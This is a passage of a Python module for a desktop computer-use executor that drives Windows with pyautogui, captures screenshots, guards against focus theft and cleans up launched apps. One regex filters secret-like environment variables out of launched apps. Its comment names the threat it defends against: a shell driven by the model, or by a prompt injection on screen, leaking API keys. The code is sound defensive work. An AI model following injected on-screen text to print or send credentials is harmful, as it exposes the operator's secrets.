"""Desktop executor for full-screen computer-use automation.

DPI and click-coordinate pipeline notes live in ``executor/dpi.py`` (KAN-90).
"""

from __future__ import annotations

import asyncio
import ctypes
import logging
import os
import re
import subprocess
import sys
from collections.abc import Awaitable, Callable
from pathlib import Path
from types import SimpleNamespace
from uuid import uuid4

import mss
import mss.tools
import pyperclip

from operon.agent.app_catalog import APP_LAUNCH_TARGETS
from operon.agent.perception.change_note import ChangeNoteBuffer
from operon.agent.perception.settle import signature_from_rgb
from operon.core.paths import desktop_artifacts_dir
from operon.core.settings import get_settings
from operon.core.vault import SecretError, redact, resolve_for_type
from operon.executor import dpi, sendinput

# OPERON_DPI_AWARE: pyautogui calls SetProcessDPIAware() when imported, which locks the process
# at system-aware for good. Per-monitor-v2 has to be set first, so this runs before that import.
dpi.apply_awareness_early()

try:
    import pyautogui
except Exception as exc:  # pragma: no cover - exercised on headless CI
    _PYAUTOGUI_IMPORT_ERROR = exc

    def _unavailable(*_args, **_kwargs):
        raise RuntimeError("pyautogui is unavailable in this environment") from _PYAUTOGUI_IMPORT_ERROR

    pyautogui = SimpleNamespace(  # type: ignore[assignment]
        FAILSAFE=True,
        PAUSE=0,
        click=_unavailable,
        doubleClick=_unavailable,
        rightClick=_unavailable,
        write=_unavailable,
        press=_unavailable,
        hotkey=_unavailable,
        moveTo=_unavailable,
        mouseDown=_unavailable,
        mouseUp=_unavailable,
        scroll=_unavailable,
    )

from operon.models.capture import CaptureFrame  # noqa: E402
from operon.models.common import FailureCategory, LoopStage  # noqa: E402
from operon.models.execution import (  # noqa: E402
    ExecutedAction,
    ExecutionAttemptTrace,
    ExecutionTrace,
)
from operon.models.policy import ActionType, AgentAction  # noqa: E402

from .browser import Executor  # noqa: E402

logger = logging.getLogger(__name__)

# Windows-only: pass to subprocess.run/Popen so the spawned process does NOT
# allocate a conhost.exe console window — that flash steals focus from the
# user's foreground app on every taskkill / app-launch invocation. 0 on
# non-Windows is a no-op (creationflags is ignored outside win32).
_NO_CONSOLE = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
_NEW_CONSOLE = subprocess.CREATE_NEW_CONSOLE if sys.platform == "win32" else 0
# Console apps launched with _NO_CONSOLE run with no window at all; they need a console of their own.
_CONSOLE_APPS = frozenset({"cmd.exe", "powershell.exe"})
_MOUSEEVENTF_HWHEEL = 0x01000


def _image_pids(exe_name: str) -> frozenset[int] | None:
    """PIDs of running processes named ``exe_name``, or None when they can't be listed."""
    try:
        result = subprocess.run(
            ["tasklist", "/FI", f"IMAGENAME eq {exe_name}", "/FO", "CSV", "/NH"],
            capture_output=True, text=True, timeout=5,
            creationflags=_NO_CONSOLE,
        )
    except Exception:
        logger.debug("tasklist failed for %s", exe_name, exc_info=True)
        return None
    if result.returncode != 0:
        return None
    pids: set[int] = set()
    for line in (result.stdout or "").splitlines():
        # "notepad.exe","1234","Console","1","12,345 K"; no match prints an INFO line.
        fields = [field.strip('"') for field in line.strip().split('","')]
        if len(fields) >= 2 and fields[0].lower() == exe_name.lower() and fields[1].isdigit():
            pids.add(int(fields[1]))
    return frozenset(pids)


def _sample_box(virtual: dict, x: int, y: int, radius: int) -> dict[str, int]:
    """The (2*radius)-square around (x, y), kept inside the virtual screen.

    Desktop coordinates are virtual-screen coordinates: a monitor left of or above
    the primary one has negative x or y, so clamping to 0 would sample the wrong display.
    """
    size = radius * 2
    left = min(max(virtual["left"], x - radius), virtual["left"] + virtual["width"] - size)
    top = min(max(virtual["top"], y - radius), virtual["top"] + virtual["height"] - size)
    return {"left": left, "top": top, "width": size, "height": size}


def _hscroll(amount: int, x: int, y: int) -> None:
    """Scroll sideways at (x, y); positive = right. pyautogui's hscroll scrolls
    vertically on Windows, so send a horizontal wheel event there."""
    pyautogui.moveTo(x, y)
    if sys.platform == "win32":
        ctypes.windll.user32.mouse_event(_MOUSEEVENTF_HWHEEL, 0, 0, int(amount), 0)  # type: ignore[attr-defined]
    else:
        pyautogui.hscroll(amount, x=x, y=y)


# Environment variables an app the agent launches must not inherit: a shell the
# model (or a prompt injection on screen) drives could otherwise print or send
# the server's API keys and tokens.
_SECRET_ENV_RE = re.compile(r"KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|WEBHOOK|DATABASE_URL", re.IGNORECASE)


def _launch_env() -> dict[str, str]:
    """This process's environment minus anything that looks like a secret."""
    return {name: value for name, value in os.environ.items() if not _SECRET_ENV_RE.search(name)}


def _mss():
    """Return an MSS context manager using the non-deprecated constructor when available."""
    factory = getattr(mss, "MSS", mss.mss)
    return factory()

if not hasattr(os, "startfile"):
    def _missing_startfile(_path: str) -> None:
        raise NotImplementedError("os.startfile is only available on Windows")

    os.startfile = _missing_startfile  # type: ignore[attr-defined]

# Apps that must NEVER be terminated by cleanup or blocked by safety guards.
_PROTECTED_PROCESSES: set[str] = {
    "code", "code.exe",           # VS Code
    "devenv", "devenv.exe",       # Visual Studio
    "cursor", "cursor.exe",       # Cursor IDE
    "claude", "claude.exe",       # Claude Code
    "windsurf", "windsurf.exe",   # Windsurf IDE
    "explorer", "explorer.exe",   # Windows shell
    "cmd", "cmd.exe",
    "powershell", "powershell.exe",
    "wt", "wt.exe",              # Windows Terminal
    "python", "python.exe",
    "uvicorn",                    # Our own server
}

class HardwareBaselineError(RuntimeError):
    """Raised when the display hardware baseline check fails.

    Coordinate targeting is geometry-sensitive: a sub-minimum resolution or
    severely mismatched DPI scaling produces systematic drift that cannot be
    corrected at runtime.  Stop early rather than execute hallucinated clicks.
    """


def validate_display_baseline(*, require_min_resolution: tuple[int, int] = (1280, 720)) -> None:
    """Check DPI scaling and primary-monitor resolution against automation baseline.

    DPI scaling:            logs a CoordDriftWarning only when drift is really possible
                            (``dpi.drift_expected``: the process is DPI-unaware, or system-aware
                            with a monitor whose true DPI differs from the system's). A uniform
                            125 % or 150 % setup is fine and stays silent.
    Resolution < minimum:   raises HardwareBaselineError — too little screen space for
                            reliable element targeting.
    """
    if sys.platform != "win32":
        return

    # --- DPI scaling ---
    scale_pct = "?"
    try:
        system_dpi = dpi.get_system_dpi()
        scale_pct = round(system_dpi / 96 * 100)
        awareness = dpi.get_awareness()
        if dpi.drift_expected(awareness, system_dpi, dpi.enum_monitors()):
            logger.warning(
                "CoordDriftWarning: the process is %s-aware at %s%% system scale and a display's scale "
                "differs from what the process sees, so click coordinates can drift. "
                "Set OPERON_DPI_AWARE=on to fix it.",
                awareness,
                scale_pct,
            )
    except (AttributeError, OSError) as exc:
        logger.debug("validate_display_baseline: DPI check skipped: %s", exc)

    # --- Resolution ---
    try:
        with _mss() as sct:
            if not sct.monitors or len(sct.monitors) < 2:
                return
            primary = sct.monitors[1]
            w, h = primary["width"], primary["height"]
        min_w, min_h = require_min_resolution
        if w < min_w or h < min_h:
            raise HardwareBaselineError(
                f"Primary display resolution {w}x{h} is below the required minimum "
                f"{min_w}x{min_h}. Element targeting will be unreliable at this size. "
                "Increase your display resolution before running Operon."
            )
        logger.debug("Display baseline OK: %dx%d @ %d%% DPI", w, h, scale_pct)
    except HardwareBaselineError:
        raise
    except Exception as exc:
        logger.debug("validate_display_baseline: resolution check skipped: %s", exc)


def _set_dpi_awareness() -> None:
    """Set per-monitor DPI awareness at process startup on Windows.

    Must be called once before any window or HDC is created (done in __init__).
    Uses PMv2 (DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2, Win10 1607+) so each
    monitor's DPI is honoured independently. Falls back to PMv1 shcore, then the
    legacy v1 API, so older OS versions still get something sensible.
    """
    if sys.platform != "win32":
        return
    try:
        # PMv2: -4 == DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 (Win10 1607+)
        # The handle must be passed pointer-sized; a plain int is 32-bit and the call fails.
        # It also fails (returns 0, no exception) when awareness was already fixed, e.g. by
        # pyautogui's import-time SetProcessDPIAware: dpi.warn_if_drifting() reports that (KAN-90).
        ctypes.windll.user32.SetProcessDpiAwarenessContext(ctypes.c_void_p(-4))  # type: ignore[attr-defined]
    except (AttributeError, OSError):
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)  # type: ignore[attr-defined]
        except (AttributeError, OSError):
            try:
                ctypes.windll.user32.SetProcessDPIAware()  # type: ignore[attr-defined]
            except (AttributeError, OSError):
                pass


def _foreground_monitor() -> dict | None:
    """Return the mss monitor dict for whichever display contains the foreground window.

    Falls back to None when the Win32 calls are unavailable (non-Windows, or the
    foreground window handle is 0). The caller should fall back to monitors[1].
    """
    if sys.platform != "win32":
        return None
    try:
        user32 = ctypes.windll.user32  # type: ignore[attr-defined]
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return None
        # MONITOR_DEFAULTTONEAREST = 2
        hmon = user32.MonitorFromWindow(hwnd, 2)
        if not hmon:
            return None
        info = ctypes.create_string_buffer(40)
        ctypes.c_uint32.from_buffer(info, 0).value = 40  # cbSize
        if not user32.GetMonitorInfoA(hmon, info):
            return None
        # rcMonitor occupies bytes 4-20: left, top, right, bottom (4xint32). Match the
        # full rect: monitors can share a left edge or have negative origins (KAN-90).
        left, top, right, bottom = (ctypes.c_int32.from_buffer(info, 4 + i * 4).value for i in range(4))
        with _mss() as sct:
            # skip monitors[0] (the virtual combined display)
            return dpi.match_monitor(sct.monitors[1:], (left, top, right, bottom))  # type: ignore[arg-type]
    except Exception as exc:
        logger.debug("_foreground_monitor: %s", exc)
    return None


def _foreground_window() -> int | None:
    """The handle of the window in front, or None off Windows or when there is none."""
    if sys.platform != "win32":
        return None
    try:
        return int(ctypes.windll.user32.GetForegroundWindow()) or None  # type: ignore[attr-defined]
    except Exception:
        return None


def _window_owner(hwnd: int) -> tuple[int | None, str]:
    """(process id, title) of a window; (None, "") when it cannot be read."""
    if sys.platform != "win32":
        return None, ""
    try:
        user32 = ctypes.windll.user32  # type: ignore[attr-defined]
        pid = ctypes.c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        buf = ctypes.create_unicode_buffer(256)
        user32.GetWindowTextW(hwnd, buf, 256)
        return (int(pid.value) or None), buf.value
    except Exception:
        return None, ""


# Actions that write to whatever window is in front; the focus guard (KAN-92) covers these.
_FOCUS_GUARDED_ACTIONS = frozenset({
    ActionType.CLICK,
    ActionType.DOUBLE_CLICK,
    ActionType.TRIPLE_CLICK,
    ActionType.RIGHT_CLICK,
    ActionType.TYPE,
    ActionType.PRESS_KEY,
    ActionType.HOTKEY,
    ActionType.DRAG,
    ActionType.SCROLL,
})


def _bring_to_front(hwnd: int) -> bool:
    """Put *hwnd* back in front. False when it is gone or already in front."""
    if sys.platform != "win32":
        return False
    try:
        user32 = ctypes.windll.user32  # type: ignore[attr-defined]
        if not user32.IsWindow(hwnd) or user32.GetForegroundWindow() == hwnd:
            return False
        if user32.IsIconic(hwnd):
            user32.ShowWindow(hwnd, 9)  # SW_RESTORE
        # Windows only lets the process that had the last input change the foreground
        # window; a tap of Alt counts as that input.
        user32.keybd_event(0x12, 0, 0, 0)  # VK_MENU down
        user32.keybd_event(0x12, 0, 0x0002, 0)  # VK_MENU up
        user32.BringWindowToTop(hwnd)
        return bool(user32.SetForegroundWindow(hwnd))
    except Exception as exc:
        logger.debug("_bring_to_front: %s", exc)
        return False


# PyAutoGUI expects lowercase key names. Normalise common variants the LLM may emit.
_PYAUTOGUI_KEY_MAP: dict[str, str] = {
    "escape": "escape",
    "esc": "escape",
    "enter": "enter",
    "return": "enter",
    "backspace": "backspace",
    "delete": "delete",
    "del": "delete",
    "tab": "tab",
    "space": "space",
    "arrowup": "up",
    "arrowdown": "down",
    "arrowleft": "left",
    "arrowright": "right",
    "pageup": "pageup",
    "pagedown": "pagedown",
    "home": "home",
    "end": "end",
    "insert": "insert",
    # Modifiers as Claude computer use names them (via Playwright-style names).
    "control": "ctrl",
    "meta": "win",
    "super": "win",
    "cmd": "win",
}


def _normalize_key_pyautogui(key: str) -> str:
    return _PYAUTOGUI_KEY_MAP.get(key.lower(), key.lower())


def _unknown_keys(keys: list[str]) -> list[str]:
    """Key names pyautogui would silently ignore (it presses nothing for them)."""
    known = getattr(pyautogui, "KEYBOARD_KEYS", None)
    if not isinstance(known, (list, tuple, set, frozenset)):
        return []  # pyautogui unavailable or stubbed: nothing to check against
    return [key for key in keys if key not in known]


class DesktopExecutor(Executor):
    """Desktop executor using pyautogui/mss for full-screen automation."""

    # Hard floor/ceiling for the adaptive servo threshold (pixel²).
    # Floor prevents the threshold from collapsing so low that every click aborts.
    # Ceiling prevents it from growing so high that genuinely blank regions pass.
    _SERVO_THRESHOLD_MIN: float = 8.0
    _SERVO_THRESHOLD_MAX: float = 80.0
    _SERVO_THRESHOLD_DEFAULT: float = 20.0

    def __init__(
        self,
        *,
        artifact_dir: str | Path | None = None,
        type_interval: float = 0.03,
        post_action_delay: float = 0.15,
        post_launch_delay: float = 0.8,
    ) -> None:
        self._artifact_dir = Path(artifact_dir) if artifact_dir is not None else desktop_artifacts_dir()
        self._artifact_dir.mkdir(parents=True, exist_ok=True)
        self._type_interval = type_interval
        self._post_action_delay = post_action_delay
        self._change_notes = ChangeNoteBuffer()
        self._post_launch_delay = post_launch_delay
        self._current_run_id: str | None = None
        self._launched_processes: dict[str, list[subprocess.Popen]] = {}
        self._secrets_used: dict[str, set[str]] = {}  # run_id → secret values typed (KAN-103), masked on clipboard reads
        self._launched_app_names: dict[str, list[str]] = {}  # run_id → exe names for taskkill fallback
        # run_id → exe name → PIDs of that image already running before the run first
        # launched it. Cleanup kills only newer PIDs, never the user's own windows.
        # run_id -> exe name -> PIDs of that image that appeared during one of the run's launches
        self._owned_pids: dict[str, dict[str, set[int]]] = {}
        # Set by the loop around a batch: checked before each later child, returns
        # why it must not run (e.g. the run was stopped), or None.
        self.batch_child_check: Callable[[AgentAction], Awaitable[str | None]] | None = None
        self._run_recorders: dict[str, object] = {}   # run_id → ScreenRecorder
        self._run_video_paths: dict[str, Path] = {}   # run_id → final video path
        # Runs whose apps close as soon as the run ends (the task page asks for this).
        # Benchmarks leave it off: they grade the machine first, then call cleanup_run.
        self._close_when_done: set[str] = set()
        # run_id -> the window in front after the run's last action: the one it works in.
        self._work_windows: dict[str, int] = {}
        # OPERON_FOCUS_GUARD: (hwnd, pid, title) of the window in front when the model last saw the screen.
        # Armed only by the loop's capture, spent by the first action after it. Our own
        # post-action captures must not re-arm it: windows opened by the agent's actions are not stolen.
        self._focus_ref: tuple[int, int | None, str] | None = None
        self._internal_capture = False

        _set_dpi_awareness()
        if not get_settings().test_safe_mode:
            dpi.warn_if_drifting()
            validate_display_baseline()
            self._noise_floor, self._servo_threshold = self._calibrate_servo_threshold()
        else:
            self._noise_floor = 0.0
            self._servo_threshold = self._SERVO_THRESHOLD_DEFAULT
        logger.debug(
            "servo_threshold calibrated: noise_floor=%.2f threshold=%.2f",
            self._noise_floor, self._servo_threshold,
        )
        pyautogui.FAILSAFE = True
        pyautogui.PAUSE = 0

    def set_current_run_id(self, run_id: str) -> None:
        """Set the active run ID so launched processes are tracked per run."""
        self._current_run_id = run_id

    def _calibrate_servo_threshold(self) -> tuple[float, float]:
        """Sample 5 random 100×100 px desktop crops to establish the Idle Noise Floor.

        The noise floor is the mean pixel variance of a visually 'idle' desktop —
        i.e., textured wallpaper, taskbar icons, or anti-aliased text that create
        genuine non-zero variance even in regions with no interactive elements.

        Threshold scaling rules:
        - High-contrast / very low noise floor (< 5 px²): desktop is mostly flat
          solid colours.  The default 20 px² threshold is fine — return as-is.
        - Normal noise floor (5–40 px²): scale the threshold to noise_floor × 0.75
          so the guard adapts to ambient texture density.
        - High noise floor (> 40 px²): desktop is heavily textured (e.g. live
          wallpaper, HDR).  Cap at _SERVO_THRESHOLD_MAX to avoid false aborts.

        Returns (noise_floor, threshold) both in pixel² units.
        """
        noise_floor = self._sample_noise_floor(num_crops=5, crop_radius=50)
        if noise_floor < 5.0:
            # High-contrast or flat desktop — default threshold is already generous
            threshold = self._SERVO_THRESHOLD_DEFAULT
        elif noise_floor <= 40.0:
            # Scale threshold proportionally to ambient texture
            threshold = noise_floor * 0.75
        else:
            # Very noisy desktop — cap to avoid making the guard useless
            threshold = self._SERVO_THRESHOLD_MAX
        threshold = max(self._SERVO_THRESHOLD_MIN, min(self._SERVO_THRESHOLD_MAX, threshold))
        logger.info(
            "servo_calibration: noise_floor=%.2f px² → threshold=%.2f px²",
            noise_floor, threshold,
        )
        return noise_floor, threshold

    def _sample_noise_floor(self, num_crops: int = 5, crop_radius: int = 50) -> float:
        """Capture num_crops random 100×100 px regions and return their mean variance.

        Crops are spread across the primary monitor using a seeded random so the
        sampling is reproducible across calibration calls within the same session.
        Falls back to 0.0 (high-contrast safe default) if mss is unavailable.
        """
        import random
        try:
            with _mss() as sct:
                if len(sct.monitors) < 2:
                    return 0.0
                mon = sct.monitors[1]
                mon_w, mon_h = mon["width"], mon["height"]
                mon_l, mon_t = mon["left"], mon["top"]

            rng = random.Random(42)  # reproducible seed for calibration
            margin = crop_radius + 2
            variances: list[float] = []
            with _mss() as sct:
                for _ in range(num_crops):
                    cx = rng.randint(margin, max(margin + 1, mon_w - margin)) + mon_l
                    cy = rng.randint(margin, max(margin + 1, mon_h - margin)) + mon_t
                    raw = self._sample_region(cx, cy, radius=crop_radius)
                    if not raw:
                        continue
                    mean = sum(raw) / len(raw)
                    var = sum((b - mean) ** 2 for b in raw) / len(raw)
                    variances.append(var)
                    logger.debug(
                        "noise_floor_sample: crop=(%d,%d) variance=%.2f",
                        cx, cy, var,
                    )
            return sum(variances) / len(variances) if variances else 0.0
        except Exception as exc:
            logger.debug("noise_floor_sample: failed, defaulting to 0.0: %s", exc)
            return 0.0

    def _coord_in_monitor_bounds(self, virt_x: int, virt_y: int) -> tuple[bool, list[dict]]:
        """Return (in_bounds, physical_monitors) for the given virtual-desktop coord."""
        try:
            with _mss() as sct:
                monitors = list(sct.monitors[1:])
            if not monitors:
                return True, monitors
            in_bounds = any(
                mon["left"] <= virt_x < mon["left"] + mon["width"]
                and mon["top"] <= virt_y < mon["top"] + mon["height"]
                for mon in monitors
            )
            return in_bounds, monitors
        except Exception:
            return True, []

    async def reset_desktop(self) -> None:
        """Minimize all windows (Win+D) to give each task a clean desktop."""
        try:
            await asyncio.to_thread(pyautogui.hotkey, "win", "d")
            await asyncio.sleep(1.0)
        except Exception:
            logger.debug("reset_desktop: Win+D failed, continuing anyway", exc_info=True)
            await asyncio.sleep(0.5)

    async def context_reset(self) -> None:
        """Dismiss open modals/dropdowns, clear focus traps, scroll to top."""
        try:
            await asyncio.to_thread(pyautogui.press, "escape")
            await asyncio.sleep(0.2)
            await asyncio.to_thread(pyautogui.press, "escape")
            await asyncio.sleep(0.1)
        except Exception:
            logger.debug("context_reset: escape press failed", exc_info=True)
        try:
            with _mss() as sct:
                mon = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                cx = mon["left"] + mon["width"] // 2
                cy = mon["top"] + mon["height"] // 3  # upper-third: avoids taskbar
            await asyncio.to_thread(pyautogui.click, cx, cy)
            await asyncio.sleep(0.1)
        except Exception:
            logger.debug("context_reset: body click failed", exc_info=True)
        try:
            await asyncio.to_thread(pyautogui.hotkey, "ctrl", "home")
        except Exception:
            logger.debug("context_reset: ctrl+home failed", exc_info=True)

    async def session_reset(self, start_url: str | None = None) -> None:
        """Re-baseline window focus: dismiss stacked UI state and cycle focus."""
        await self.context_reset()
        await asyncio.sleep(0.3)
        try:
            await asyncio.to_thread(pyautogui.hotkey, "alt", "tab")
            await asyncio.sleep(0.4)
            await asyncio.to_thread(pyautogui.hotkey, "alt", "tab")
            await asyncio.sleep(0.3)
        except Exception:
            logger.debug("session_reset: alt+tab cycle failed", exc_info=True)

    def close_apps_when_done(self, run_id: str) -> None:
        """Close the apps *run_id* opens once it ends (succeeded, failed or stopped)."""
        self._close_when_done.add(run_id)

    async def aclose_run(self, run_id: str) -> int:
        """Called by the loop when a run ends: closes the apps it opened, if its caller asked."""
        self._secrets_used.pop(run_id, None)
        if run_id not in self._close_when_done:
            return 0
        self._close_when_done.discard(run_id)
        return await asyncio.to_thread(self.cleanup_run, run_id)

    def cleanup_run(self, run_id: str) -> int:
        """Terminate all non-protected processes launched during *run_id*.

        Returns the count of processes successfully terminated.
        Uses taskkill as a fallback for apps where the launcher process
        exited immediately (e.g. Chrome, Settings via ms-* URIs).
        """
        self._work_windows.pop(run_id, None)
        self._secrets_used.pop(run_id, None)
        procs = self._launched_processes.pop(run_id, [])
        app_names = self._launched_app_names.pop(run_id, [])
        owned = self._owned_pids.pop(run_id, {})
        closed = 0

        # Phase 1: terminate tracked Popen processes
        for proc in procs:
            try:
                if proc.poll() is not None:
                    continue  # already exited
                exe_name = Path(proc.args if isinstance(proc.args, str) else proc.args[0]).name.lower()
                if exe_name in _PROTECTED_PROCESSES:
                    logger.info("cleanup: skipping protected process %s (pid %d)", exe_name, proc.pid)
                    continue
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                closed += 1
                logger.info("cleanup: terminated %s (pid %d)", exe_name, proc.pid)
            except Exception:
                logger.debug("cleanup: failed to terminate pid %d", proc.pid, exc_info=True)

        # Phase 2: taskkill fallback for apps where launcher exited immediately
        # (Chrome, Edge, etc. spawn child processes and the parent exits). Only the
        # PIDs that appeared while the run was launching that app: killing by image
        # name, or every PID newer than the first launch, would also close a Notepad
        # or Chrome window the user opened during the run.
        for app_exe in dict.fromkeys(app_names):
            if app_exe in _PROTECTED_PROCESSES:
                continue
            mine = owned.get(app_exe)
            if not mine:
                logger.info("cleanup: can't tell %s's own processes from the user's; leaving them", app_exe)
                continue
            now = _image_pids(app_exe)
            if now is None:
                logger.info("cleanup: can't list %s processes; leaving them", app_exe)
                continue
            for pid in sorted(mine & now):
                try:
                    result = subprocess.run(
                        ["taskkill", "/PID", str(pid), "/F"],
                        capture_output=True, timeout=5,
                        creationflags=_NO_CONSOLE,
                    )
                    if result.returncode == 0:
                        closed += 1
                        logger.info("cleanup: taskkill terminated %s (pid %d)", app_exe, pid)
                except Exception:
                    logger.debug("cleanup: taskkill failed for %s pid %d", app_exe, pid, exc_info=True)

        return closed

    async def aclose(self) -> None:
        """Uniform server-shutdown teardown.

        Per-run resources are normally released as each run completes
        (stop_run_recording + the cleanup_run route). This sweeps whatever is
        still tracked when the server stops mid-run, so screen recorders and
        launched child apps don't outlive the process. Best-effort: one run's
        failure must not block teardown of the rest.
        """
        self._secrets_used.clear()
        for run_id in list(self._run_recorders):
            try:
                await self.stop_run_recording(run_id)
            except Exception:
                logger.debug("aclose: stop_run_recording failed for %s", run_id, exc_info=True)
        pending_runs = set(self._launched_processes) | set(self._launched_app_names) | set(self._owned_pids)
        for run_id in pending_runs:
            try:
                self.cleanup_run(run_id)
            except Exception:
                logger.debug("aclose: cleanup_run failed for %s", run_id, exc_info=True)

    async def settle_now(self, fallback_delay: float) -> None:
        """Wait for the screen to settle (OPERON_SETTLE_DETECT), else sleep ``fallback_delay``."""
        await self._change_notes.settle(self._grab_signature, fallback_delay)

    def pop_change_note(self) -> str | None:
        """The change notes collected since the last call (OPERON_CHANGE_NOTE), or None."""
        return self._change_notes.pop()

    async def _grab_signature(self) -> bytes | None:
        """One small grayscale frame of the screen, for settle detection."""
        return await asyncio.to_thread(self._grab_signature_sync)

    def _grab_signature_sync(self) -> bytes | None:
        try:
            with _mss() as sct:
                monitor = _foreground_monitor() or sct.monitors[1]
                shot = sct.grab(monitor)
                return signature_from_rgb(bytes(shot.rgb), shot.size)
        except Exception as exc:  # noqa: BLE001 - settle falls back to a plain sleep
            logger.debug("settle: screen grab failed: %s", exc)
            return None

    async def capture(self) -> CaptureFrame:
        """Take a 3-frame burst screenshot and return the last frame with visual velocity."""
        frame, velocity = await asyncio.to_thread(self._capture_burst_sync)
        if velocity > 0.02:
            # Screen is still animating — wait and re-capture once before perceiving
            logger.debug("High visual velocity (%.3f) detected; waiting 300ms before re-capture", velocity)
            await asyncio.sleep(0.3)
            frame, _ = await asyncio.to_thread(self._capture_burst_sync)
        if not self._internal_capture:
            self._record_focus()
        return frame

    # Windows only: the Linux executor turns this off, and off Windows the window helpers return None.
    _focus_guard_platform = True

    def _focus_guard_on(self) -> bool:
        return self._focus_guard_platform and get_settings().focus_guard

    def _record_focus(self) -> None:
        """Remember the window in front now (OPERON_FOCUS_GUARD) so a later steal is noticed."""
        if not self._focus_guard_on():
            return
        hwnd = _foreground_window()
        if not hwnd:
            # No foreground window to compare: fail open (UAC's secure desktop reports handle 0).
            self._focus_ref = None
            return
        pid, title = _window_owner(hwnd)
        self._focus_ref = (hwnd, pid, title)

    def _check_focus(self, action: AgentAction) -> ExecutedAction | None:
        """A failed result when a window from another process took focus since the capture.

        Nothing is switched back: the new window may be one the user needs to see, so the
        loop re-observes and the model decides from the pixels."""
        ref = self._focus_ref
        if ref is None or not self._focus_guard_on():
            return None
        self._focus_ref = None  # any action spends it: only the first one after a screenshot is checked
        if action.action_type not in _FOCUS_GUARDED_ACTIONS:
            return None
        hwnd = _foreground_window()
        if hwnd is None or hwnd == ref[0]:
            return None
        pid, title = _window_owner(hwnd)
        if pid is not None and pid == ref[1]:
            return None  # a dialog or window the same program opened
        old = ref[2] or "the previous window"
        return self._fail(
            action,
            f"focus_stolen: {title or 'another window'} took focus from {old}; re-observing",
            FailureCategory.FOCUS_STOLEN,
        )

    def _capture_burst_sync(self) -> tuple[CaptureFrame, float]:
        """Capture t0, t+100ms, t+200ms frames; return (last_frame, visual_velocity)."""
        import time as _time
        with _mss() as sct:
            monitor = _foreground_monitor() or sct.monitors[1]
            sct.grab(monitor)  # t0 frame (discarded — used only to warm up the capture pipeline)
            _time.sleep(0.1)
            shot1 = sct.grab(monitor)
            _time.sleep(0.1)
            shot2 = sct.grab(monitor)

            # Visual velocity: fraction of sampled pixels that changed between shot1→shot2
            px1 = bytes(shot1.rgb)
            px2 = bytes(shot2.rgb)
            total_pixels = shot2.width * shot2.height
            # Sample every 9th pixel (R channel only) for speed
            changed = sum(1 for i in range(0, len(px1), 27) if abs(px1[i] - px2[i]) > 8)
            sampled = max(1, total_pixels // 9)
            velocity = changed / sampled

            filename = f"desktop_{uuid4().hex[:8]}.png"
            filepath = self._artifact_dir / filename
            mss.tools.to_png(shot2.rgb, shot2.size, output=str(filepath))
            return CaptureFrame(
                artifact_path=str(filepath),
                width=shot2.width,
                height=shot2.height,
                mime_type="image/png",
                monitor_left=monitor.get("left", 0),
                monitor_top=monitor.get("top", 0),
                visual_velocity=min(velocity, 1.0),
            ), velocity

    async def execute(self, action: AgentAction) -> ExecutedAction:
        """Execute a desktop action using pyautogui."""
        if action.action_type is ActionType.BATCH:
            return await self._execute_batch(action)
        at = action.action_type
        dispatch = {
            ActionType.CLICK: self._exec_click,
            ActionType.DOUBLE_CLICK: self._exec_double_click,
            ActionType.TRIPLE_CLICK: self._exec_triple_click,
            ActionType.RIGHT_CLICK: self._exec_right_click,
            ActionType.TYPE: self._exec_type,
            ActionType.PRESS_KEY: self._exec_press_key,
            ActionType.HOTKEY: self._exec_hotkey,
            ActionType.LAUNCH_APP: self._exec_launch_app,
            ActionType.DRAG: self._exec_drag,
            ActionType.SCROLL: self._exec_scroll,
            ActionType.HOVER: self._exec_hover,
            ActionType.READ_CLIPBOARD: self._exec_read_clipboard,
            ActionType.WRITE_CLIPBOARD: self._exec_write_clipboard,
            ActionType.SCREENSHOT_REGION: self._exec_screenshot_region,
            ActionType.WAIT: self._exec_wait,
            ActionType.STOP: self._exec_noop,
            ActionType.WAIT_FOR_USER: self._exec_noop,
            ActionType.NAVIGATE: self._exec_unsupported,
            ActionType.SELECT: self._exec_unsupported,
        }
        stolen = self._check_focus(action)
        if stolen is not None:
            return stolen
        handler = dispatch.get(at, self._exec_unsupported)
        result = await handler(action)
        self._note_work_window()
        return result

    def _note_work_window(self) -> None:
        hwnd = _foreground_window()
        if hwnd and self._current_run_id is not None:
            self._work_windows[self._current_run_id] = hwnd

    async def restore_work_window(self, run_id: str) -> bool:
        """Bring back the window the run was working in, when something else is in front.

        Answering the run on the task page puts that browser window in front of the
        app the run was using, and the next screenshot would show Operon's own page.
        Called when a paused run resumes. True when it changed the window in front."""
        hwnd = self._work_windows.get(run_id)
        if hwnd is None:
            return False
        moved = await asyncio.to_thread(_bring_to_front, hwnd)
        if moved:
            logger.info("resume: brought the run's window back to the front")
            await asyncio.sleep(0.3)
        return moved

    # ── action handlers ──────────────────────────────────────────

    def _region_has_content(
        self,
        x: int,
        y: int,
        radius: int = 50,
        baseline_variance: float | None = None,
        is_input_zone: bool = False,
    ) -> tuple[bool, float]:
        """Visual servo check: return (has_content, variance).

        has_content is False when the region around (x, y) is a uniform blank area,
        which indicates the target element has shifted or disappeared.

        Args:
            x, y:              Center of the region to sample.
            radius:            Half-side of the square crop in pixels.
            baseline_variance: Override for the adaptive threshold (pixel²).
                               Defaults to self._servo_threshold (calibrated at init).
            is_input_zone:     When True, skip the variance gate entirely. Valid for
                               known blank-but-interactable areas such as an empty text
                               editor or input field whose background is solid white.
        """
        if is_input_zone:
            logger.info(
                "[SERVO] Bypassing variance check for confirmed input zone at (%d, %d)",
                x, y,
            )
            return True, 0.0

        threshold = baseline_variance if baseline_variance is not None else self._servo_threshold
        raw = self._sample_region(x, y, radius)
        if not raw:
            return True, 0.0  # can't verify — proceed
        mean = sum(raw) / len(raw)
        variance = sum((b - mean) ** 2 for b in raw) / len(raw)
        has_content = variance > threshold
        logger.debug(
            "servo_check: coord=(%d,%d) region_variance=%.2f noise_floor=%.2f threshold=%.2f has_content=%s",
            x, y, variance, self._noise_floor, threshold, has_content,
        )
        return has_content, variance

    async def _click_preamble(
        self, action: AgentAction, kind: str,
